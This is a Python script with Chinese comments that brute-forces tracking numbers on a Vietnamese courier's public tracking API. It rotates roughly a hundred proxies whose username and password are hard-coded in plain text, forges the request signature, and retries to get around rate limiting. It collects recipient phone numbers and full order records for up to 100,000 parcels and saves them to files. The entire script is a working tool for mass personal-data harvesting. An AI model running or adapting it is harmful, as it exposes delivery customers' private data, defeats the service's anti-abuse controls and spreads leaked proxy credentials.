#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
10万订单扫描脚本 - 超强代理池版
基于实际运单号分析的密集区域配置
"""

import requests
import hashlib
import time
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# ==================== 代理池配置 ====================
PROXIES = [
    "103.141.142.153:6333:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.62:6333:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.253:6333:ytdjjovk:Hf4i0bfSjq",
    "161.123.152.115:6333:ytdjjovk:Hf4i0bfSjq",
    "107.172.55.81:6333:ytdjjovk:Hf4i0bfSjq",
    "154.36.110.199:6333:ytdjjovk:Hf4i0bfSjq",
    "173.211.0.148:6334:ytdjjovk:Hf4i0bfSjq",
    "161.123.152.115:6334:ytdjjovk:Hf4i0bfSjq",
    "107.172.55.81:6334:ytdjjovk:Hf4i0bfSjq",
    "154.36.110.199:6334:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5001:ytdjjovk:Hf4i0bfSjq",
    "45.151.162.198:6333:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5157:ytdjjovk:Hf4i0bfSjq",
    "161.123.152.115:6336:ytdjjovk:Hf4i0bfSjq",
    "107.172.55.81:6336:ytdjjovk:Hf4i0bfSjq",
    "154.36.110.199:6336:ytdjjovk:Hf4i0bfSjq",
    "173.0.54.92:6334:ytdjjovk:Hf4i0bfSjq",
    "161.123.152.115:6337:ytdjjovk:Hf4i0bfSjq",
    "107.172.55.81:6337:ytdjjovk:Hf4i0bfSjq",
    "154.36.110.199:6337:ytdjjovk:Hf4i0bfSjq",
    "173.0.54.92:6335:ytdjjovk:Hf4i0bfSjq",
    "161.123.152.115:6338:ytdjjovk:Hf4i0bfSjq",
    "107.172.55.81:6338:ytdjjovk:Hf4i0bfSjq",
    "154.36.110.199:6338:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.153:6334:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.62:6334:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.253:6334:ytdjjovk:Hf4i0bfSjq",
    "45.151.162.198:6334:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5158:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.153:6335:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.62:6335:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.253:6335:ytdjjovk:Hf4i0bfSjq",
    "45.151.162.198:6335:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5159:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.153:6336:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.62:6336:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.253:6336:ytdjjovk:Hf4i0bfSjq",
    "45.151.162.198:6336:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5160:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.153:6337:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.62:6337:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.253:6337:ytdjjovk:Hf4i0bfSjq",
    "45.151.162.198:6337:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5161:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.153:6338:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.62:6338:ytdjjovk:Hf4i0bfSjq",
    "103.141.142.253:6338:ytdjjovk:Hf4i0bfSjq",
    "45.151.162.198:6338:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5162:ytdjjovk:Hf4i0bfSjq",
    "173.211.0.148:6333:ytdjjovk:Hf4i0bfSjq",
    "161.123.152.115:6333:ytdjjovk:Hf4i0bfSjq",
    "107.172.55.81:6333:ytdjjovk:Hf4i0bfSjq",
    "154.36.110.199:6333:ytdjjovk:Hf4i0bfSjq",
    "173.0.54.92:6333:ytdjjovk:Hf4i0bfSjq",
    "173.211.0.148:6335:ytdjjovk:Hf4i0bfSjq",
    "161.123.152.115:6335:ytdjjovk:Hf4i0bfSjq",
    "107.172.55.81:6335:ytdjjovk:Hf4i0bfSjq",
    "154.36.110.199:6335:ytdjjovk:Hf4i0bfSjq",
    "173.211.0.148:6336:ytdjjovk:Hf4i0bfSjq",
    "173.211.0.148:6337:ytdjjovk:Hf4i0bfSjq",
    "173.0.54.92:6336:ytdjjovk:Hf4i0bfSjq",
    "173.211.0.148:6338:ytdjjovk:Hf4i0bfSjq",
    "173.0.54.92:6337:ytdjjovk:Hf4i0bfSjq",
    "173.0.54.92:6338:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5002:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5003:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5004:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5005:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5006:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5007:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5008:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5009:ytdjjovk:Hf4i0bfSjq",
    "23.27.184.245:5010:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5163:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5164:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5165:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5166:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5167:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5168:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5169:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5170:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5171:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5172:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5173:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5174:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5175:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5176:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5177:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5178:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5179:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5180:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5181:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5182:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5183:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5184:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5185:ytdjjovk:Hf4i0bfSjq",
    "64.137.42.112:5186:ytdjjovk:Hf4i0bfSjq",
]

# ==================== 运行配置 ====================
CONFIG = {
    'target': 100000,           # 目标找到100000个订单
    'threads_per_proxy': 2,     # 每个代理2个线程
    'total_threads': 50,        # 总线程数（根据代理池调整）
    'delay': 0.1,               # 请求延迟（秒）
    'timeout': 10,              # 请求超时（秒）
    'save_every': 100,          # 每找到100个订单保存一次
    'max_98_retries': 10,       # Code:98 最大重试次数
    'proxy_fail_threshold': 2,  # 代理失败2次就禁用
}

# ==================== 密集区域配置（基于真实数据分析）====================
DENSE_REGIONS = [
    # EB 区域 - 12个密集区（5.0%占比）
    {'prefix': 'EB', 'start': 102885483, 'end': 102885894, 'priority': 1, 'step': 1, 'name': 'EB_超密1'},
    {'prefix': 'EB', 'start': 102888238, 'end': 102890364, 'priority': 1, 'step': 1, 'name': 'EB_超密2'},
    {'prefix': 'EB', 'start': 102964844, 'end': 102969325, 'priority': 1, 'step': 1, 'name': 'EB_超密3'},
    
    # EC 区域 - 超密集区（密度8.6%！）
    {'prefix': 'EC', 'start': 149780335, 'end': 149780809, 'priority': 1, 'step': 1, 'name': 'EC_COD超密'},
    {'prefix': 'EC', 'start': 143587127, 'end': 143588309, 'priority': 1, 'step': 1, 'name': 'EC_扩展1'},
    
    # ED 区域
    {'prefix': 'ED', 'start': 121962191, 'end': 121962245, 'priority': 1, 'step': 1, 'name': 'ED_密集1'},
    
    # EF 区域 - 最多！（78.5%占比，941个订单）
    {'prefix': 'EF', 'start': 43571075, 'end': 43571359, 'priority': 1, 'step': 1, 'name': 'EF_超密1'},
    {'prefix': 'EF', 'start': 43571495, 'end': 43576271, 'priority': 1, 'step': 1, 'name': 'EF_超密2'},
    {'prefix': 'EF', 'start': 43579295, 'end': 43582396, 'priority': 1, 'step': 1, 'name': 'EF_超密3'},
    {'prefix': 'EF', 'start': 43590790, 'end': 43591680, 'priority': 1, 'step': 1, 'name': 'EF_超密4'},
    {'prefix': 'EF', 'start': 43592040, 'end': 43595735, 'priority': 1, 'step': 1, 'name': 'EF_超密5'},
    {'prefix': 'EF', 'start': 45405059, 'end': 45405093, 'priority': 1, 'step': 1, 'name': 'EF_密集6'},
    {'prefix': 'EF', 'start': 45746336, 'end': 45746469, 'priority': 1, 'step': 1, 'name': 'EF_密集7'},
    {'prefix': 'EF', 'start': 47519990, 'end': 47523345, 'priority': 1, 'step': 1, 'name': 'EF_超密8'},
    {'prefix': 'EF', 'start': 47544901, 'end': 47557176, 'priority': 1, 'step': 1, 'name': 'EF_超密9'},
    {'prefix': 'EF', 'start': 47681054, 'end': 47685970, 'priority': 1, 'step': 1, 'name': 'EF_超密10'},
    {'prefix': 'EF', 'start': 47747087, 'end': 47747436, 'priority': 1, 'step': 1, 'name': 'EF_密集11'},
    {'prefix': 'EF', 'start': 425613274, 'end': 425687997, 'priority': 2, 'step': 5, 'name': 'EF_扩展12'},
    
    # EG 区域（42个订单，6个密集区）
    {'prefix': 'EG', 'start': 40816534, 'end': 40816548, 'priority': 1, 'step': 1, 'name': 'EG_密集1'},
    {'prefix': 'EG', 'start': 40836088, 'end': 40836105, 'priority': 1, 'step': 1, 'name': 'EG_密集2'},
    {'prefix': 'EG', 'start': 40840745, 'end': 40841009, 'priority': 1, 'step': 1, 'name': 'EG_密集3'},
    {'prefix': 'EG', 'start': 46007274, 'end': 46007504, 'priority': 1, 'step': 1, 'name': 'EG_密集4'},
    {'prefix': 'EG', 'start': 47361262, 'end': 47361302, 'priority': 1, 'step': 1, 'name': 'EG_密集5'},
    {'prefix': 'EG', 'start': 47670414, 'end': 47677987, 'priority': 1, 'step': 1, 'name': 'EG_密集6'},
    
    # EH 区域（4个订单，分散）
    {'prefix': 'EH', 'start': 159113742, 'end': 162652662, 'priority': 2, 'step': 10, 'name': 'EH_扩展1'},
    {'prefix': 'EH', 'start': 253189710, 'end': 253189710, 'priority': 1, 'step': 1, 'name': 'EH_单点1'},
    {'prefix': 'EH', 'start': 593892350, 'end': 593892350, 'priority': 1, 'step': 1, 'name': 'EH_单点2'},
    
    # EI 区域（3个订单）
    {'prefix': 'EI', 'start': 153230927, 'end': 153231896, 'priority': 1, 'step': 1, 'name': 'EI_密集1'},
    
    # EJ 区域（50个订单，9个密集区）
    {'prefix': 'EJ', 'start': 408681950, 'end': 408681950, 'priority': 1, 'step': 1, 'name': 'EJ_单点1'},
    {'prefix': 'EJ', 'start': 701368250, 'end': 701369958, 'priority': 1, 'step': 1, 'name': 'EJ_密集1'},
    {'prefix': 'EJ', 'start': 701441480, 'end': 701443843, 'priority': 1, 'step': 1, 'name': 'EJ_密集2'},
    {'prefix': 'EJ', 'start': 711462436, 'end': 711463431, 'priority': 1, 'step': 1, 'name': 'EJ_密集3'},
    {'prefix': 'EJ', 'start': 720641824, 'end': 720641824, 'priority': 1, 'step': 1, 'name': 'EJ_单点2'},
    {'prefix': 'EJ', 'start': 722733979, 'end': 722734501, 'priority': 1, 'step': 1, 'name': 'EJ_密集4'},
    {'prefix': 'EJ', 'start': 727129570, 'end': 727129570, 'priority': 1, 'step': 1, 'name': 'EJ_单点3'},
    
    # EK 区域（33个订单，4个密集区）
    {'prefix': 'EK', 'start': 40033086, 'end': 41803982, 'priority': 2, 'step': 5, 'name': 'EK_扩展1'},
    {'prefix': 'EK', 'start': 42121971, 'end': 42122107, 'priority': 1, 'step': 1, 'name': 'EK_密集1'},
    {'prefix': 'EK', 'start': 42151562, 'end': 42151580, 'priority': 1, 'step': 1, 'name': 'EK_密集2'},
    {'prefix': 'EK', 'start': 42227544, 'end': 42228227, 'priority': 1, 'step': 1, 'name': 'EK_密集3'},
    {'prefix': 'EK', 'start': 43269982, 'end': 43270107, 'priority': 1, 'step': 1, 'name': 'EK_密集4'},
    {'prefix': 'EK', 'start': 43539177, 'end': 43648203, 'priority': 2, 'step': 3, 'name': 'EK_扩展2'},
    {'prefix': 'EK', 'start': 156709354, 'end': 159718633, 'priority': 2, 'step': 5, 'name': 'EK_扩展3'},
    
    # EL 区域（16个订单，4个密集区）
    {'prefix': 'EL', 'start': 135247577, 'end': 135252002, 'priority': 1, 'step': 1, 'name': 'EL_密集1'},
    {'prefix': 'EL', 'start': 135726003, 'end': 135756504, 'priority': 1, 'step': 1, 'name': 'EL_密集2'},
    {'prefix': 'EL', 'start': 136426994, 'end': 136432354, 'priority': 1, 'step': 1, 'name': 'EL_密集3'},
    {'prefix': 'EL', 'start': 138474578, 'end': 138474578, 'priority': 1, 'step': 1, 'name': 'EL_单点1'},
    {'prefix': 'EL', 'start': 155309426, 'end': 155309491, 'priority': 1, 'step': 1, 'name': 'EL_密集4'},
    
    # EM, EO, ES 区域（零散）
    {'prefix': 'EM', 'start': 50493691, 'end': 50493691, 'priority': 1, 'step': 1, 'name': 'EM_单点1'},
    {'prefix': 'EO', 'start': 76118509, 'end': 76138914, 'priority': 1, 'step': 1, 'name': 'EO_密集1'},
    {'prefix': 'ES', 'start': 76648152, 'end': 76648152, 'priority': 1, 'step': 1, 'name': 'ES_单点1'},
]

# 订单类型名称
TYPE_NAMES = {
    'EA': 'Express',
    'EB': 'Standard',
    'EC': 'COD',
    'ED': 'Document',
    'EF': 'Premium',
    'EG': 'Economy',
    'EH': 'Heavy',
    'EI': 'International',
    'EJ': 'Japan',
    'EK': 'Korea',
    'EL': 'Letter',
    'EM': 'Mail',
    'EO': 'Other',
    'ES': 'Special',
}

# ==================== 全局状态 ====================
state = {
    'found': 0,
    'tested': 0,
    'errors': 0,
    'rate_limited': 0,
    'start_time': time.time(),
    'orders': [],
    'proxy_stats': {},
    'lock': Lock(),
}

# ==================== 代理池管理 ====================
class ProxyPool:
    def __init__(self, proxies):
        self.proxies = []
        self.failed_count = {}
        self.success_count = {}
        self.current_index = 0
        self.lock = Lock()
        
        for proxy_str in proxies:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                self.proxies.append({
                    'ip': ip,
                    'port': port,
                    'user': user,
                    'password': password,
                    'enabled': True,
                    'proxy_str': f'http://{user}:{password}@{ip}:{port}'
                })
                self.failed_count[proxy_str] = 0
                self.success_count[proxy_str] = 0
    
    def get_next_proxy(self):
        """获取下一个可用代理"""
        with self.lock:
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxies)
                
                if proxy['enabled']:
                    return {
                        'http': proxy['proxy_str'],
                        'https': proxy['proxy_str']
                    }, f"{proxy['ip']}:{proxy['port']}"
                
                attempts += 1
            
            return None, None
    
    def mark_failure(self, proxy_display):
        """标记代理失败"""
        with self.lock:
            for proxy in self.proxies:
                if f"{proxy['ip']}:{proxy['port']}" == proxy_display:
                    key = f"{proxy['ip']}:{proxy['port']}:{proxy['user']}:{proxy['password']}"
                    self.failed_count[key] = self.failed_count.get(key, 0) + 1
                    
                    # 失败2次就禁用代理
                    if self.failed_count[key] >= CONFIG['proxy_fail_threshold']:
                        proxy['enabled'] = False
                        print(f"⚠️  代理 {proxy_display} 已禁用（失败{self.failed_count[key]}次）")
                    break
    
    def mark_success(self, proxy_display):
        """标记代理成功"""
        with self.lock:
            for proxy in self.proxies:
                if f"{proxy['ip']}:{proxy['port']}" == proxy_display:
                    key = f"{proxy['ip']}:{proxy['port']}:{proxy['user']}:{proxy['password']}"
                    self.success_count[key] = self.success_count.get(key, 0) + 1
                    # 成功后重置失败计数
                    self.failed_count[key] = 0
                    break

# 创建代理池
proxy_pool = ProxyPool(PROXIES)

# ==================== 查询订单 ====================
def query_order(code, proxy_dict, proxy_display):
    """查询单个订单"""
    url = "https://donhang.ghn.vn/api/v1/public/tracking/search"
    
    signature_str = f"code={code}&source=tracking_page"
    signature = hashlib.md5(signature_str.encode()).hexdigest()
    
    payload = {
        "code": code,
        "signature": signature,
        "source": "tracking_page"
    }
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    # 处理 Code:98 的重试逻辑
    for attempt_98 in range(CONFIG['max_98_retries']):
        try:
            response = requests.post(
                url, 
                json=payload, 
                headers=headers,
                proxies=proxy_dict,
                timeout=CONFIG['timeout']
            )
            
            data = response.json()
            code_value = data.get('Code', 0)
            
            if code_value == 98:
                # 显示98重试
                print(f"98..", end='', flush=True)
                proxy_pool.mark_failure(proxy_display)
                time.sleep(0.3)
                
                # 切换到新代理重试
                proxy_dict, proxy_display = proxy_pool.get_next_proxy()
                if not proxy_dict:
                    return None, "NO_PROXY"
                continue
            
            # 非98错误，返回结果
            if code_value == 1:
                proxy_pool.mark_success(proxy_display)
                return data.get('Data'), "SUCCESS"
            else:
                return None, f"Code:{code_value}"
                
        except requests.exceptions.Timeout:
            return None, "TIMEOUT"
        except requests.exceptions.ProxyError:
            proxy_pool.mark_failure(proxy_display)
            return None, "PROXY_ERROR"
        except Exception as e:
            return None, f"ERROR:{str(e)[:30]}"
    
    # 98重试耗尽
    return None, "MAX_98_RETRY"

# ==================== 扫描密集区域 ====================
def scan_dense_region(region):
    """扫描单个密集区域"""
    prefix = region['prefix']
    start = region['start']
    end = region['end']
    step = region['step']
    name = region['name']
    
    print(f"\n🔍 开始扫描 [{name}] {prefix}{start:09d}-{prefix}{end:09d} (步长:{step})")
    
    region_found = 0
    region_tested = 0
    
    for num in range(start, end + 1, step):
        if state['found'] >= CONFIG['target']:
            break
        
        code = f"{prefix}{num:09d}VN"
        
        # 获取代理
        proxy_dict, proxy_display = proxy_pool.get_next_proxy()
        if not proxy_dict:
            print(f"\n❌ 无可用代理！")
            break
        
        # 查询订单
        data, status = query_order(code, proxy_dict, proxy_display)
        
        region_tested += 1
        with state['lock']:
            state['tested'] += 1
        
        if status == "SUCCESS" and data:
            region_found += 1
            
            # 提取手机号
            phone = "N/A"
            if 'OrderInfo' in data:
                for item in data['OrderInfo']:
                    if item.get('Key') == 'Người nhận':
                        value = item.get('Value', '')
                        phone_match = re.search(r'\d{10,11}', value)
                        if phone_match:
                            phone = phone_match.group()
                        break
            
            order_info = {
                'code': code,
                'phone': phone,
                'data': data,
                'found_at': datetime.now().isoformat()
            }
            
            with state['lock']:
                state['found'] += 1
                state['orders'].append(order_info)
                
                # 实时显示
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                success_rate = (state['found'] / state['tested'] * 100) if state['tested'] > 0 else 0
                
                print(f"\n✅ [{state['found']}/{CONFIG['target']}] {code} | 📞 {phone} | ⚡ {speed:.1f}/s | 成功率:{success_rate:.2f}%")
                
                # 自动保存
                if state['found'] % CONFIG['save_every'] == 0:
                    save_progress()
        
        elif status.startswith("Code:"):
            pass  # 静默处理其他错误码
        else:
            with state['lock']:
                state['errors'] += 1
        
        time.sleep(CONFIG['delay'])
    
    print(f"✅ [{name}] 完成！找到 {region_found}/{region_tested}")

# ==================== 保存进度 ====================
def save_progress():
    """保存扫描结果"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # 保存JSON
    json_file = f"orders_{timestamp}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'total_found': state['found'],
            'total_tested': state['tested'],
            'success_rate': f"{state['found']/state['tested']*100:.2f}%" if state['tested'] > 0 else "0%",
            'orders': state['orders']
        }, f, ensure_ascii=False, indent=2)
    
    # 保存TXT（运单号+手机号）
    txt_file = f"orders_{timestamp}.txt"
    with open(txt_file, 'w', encoding='utf-8') as f:
        for order in state['orders']:
            f.write(f"{order['code']}\t{order['phone']}\n")
    
    print(f"💾 已保存 {state['found']} 个订单到 {json_file} 和 {txt_file}")

def load_progress():
    """加载上次进度"""
    import glob
    progress_files = glob.glob("orders_*.json")
    if not progress_files:
        return
    
    latest_file = max(progress_files)
    try:
        with open(latest_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
            state['orders'] = data.get('orders', [])
            state['found'] = len(state['orders'])
            print(f"📂 已加载 {state['found']} 个订单从 {latest_file}")
    except:
        pass

# ==================== 主程序 ====================
def main():
    print("="*80)
    print("🚀 10万订单扫描系统 - 超强代理池版")
    print("="*80)
    print(f"📊 配置：")
    print(f"   - 代理池: {len(PROXIES)} 个")
    print(f"   - 线程数: {CONFIG['total_threads']}")
    print(f"   - 目标订单: {CONFIG['target']:,}")
    print(f"   - 密集区域: {len(DENSE_REGIONS)} 个")
    print(f"   - Code:98重试: {CONFIG['max_98_retries']} 次")
    print(f"   - 代理失败阈值: {CONFIG['proxy_fail_threshold']} 次")
    print("="*80)
    
    # 加载上次进度
    load_progress()
    
    # 按优先级排序密集区域
    sorted_regions = sorted(DENSE_REGIONS, key=lambda x: x.get('priority', 1))
    
    # 使用线程池扫描
    with ThreadPoolExecutor(max_workers=CONFIG['total_threads']) as executor:
        futures = []
        
        for region in sorted_regions:
            if state['found'] >= CONFIG['target']:
                break
            
            future = executor.submit(scan_dense_region, region)
            futures.append(future)
        
        # 等待所有任务完成
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"❌ 任务异常: {e}")
    
    # 最终保存
    save_progress()
    
    # 统计报告
    elapsed = time.time() - state['start_time']
    print("\n" + "="*80)
    print("📊 扫描完成！最终统计：")
    print("="*80)
    print(f"✅ 找到订单: {state['found']:,}")
    print(f"🔍 已测试: {state['tested']:,}")
    print(f"❌ 错误数: {state['errors']:,}")
    print(f"⚡ 成功率: {state['found']/state['tested']*100:.2f}%" if state['tested'] > 0 else "0%")
    print(f"⏱️  总耗时: {elapsed/60:.1f} 分钟")
    print(f"🚀 平均速度: {state['tested']/elapsed:.1f} 次/秒")
    print("="*80)

if __name__ == "__main__":
    main()
